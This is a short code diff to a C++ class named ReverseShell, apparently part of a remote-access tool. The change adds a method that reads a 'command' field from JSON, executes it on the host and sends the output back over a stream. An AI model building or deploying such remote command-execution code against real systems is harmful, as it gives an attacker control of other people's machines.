@@ -89,9 +89,12 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
 
 ReverseShell::ReverseShell(const Stream &stream) : Sender(stream){}
 
-void ReverseShell::send() {
-    std::string command = stream.readString();
-    std::cout << command << std::endl;
+void ReverseShell::executeCommandAndSendResult(nlohmann::json jsonObject){
+    std::string command = jsonObject["command"];
     std::string resultOfCommand = executeCommand(Converter::string2wstring(command));
     stream.sendString(resultOfCommand.c_str());
+}
+
+void ReverseShell::send() {
+
 }
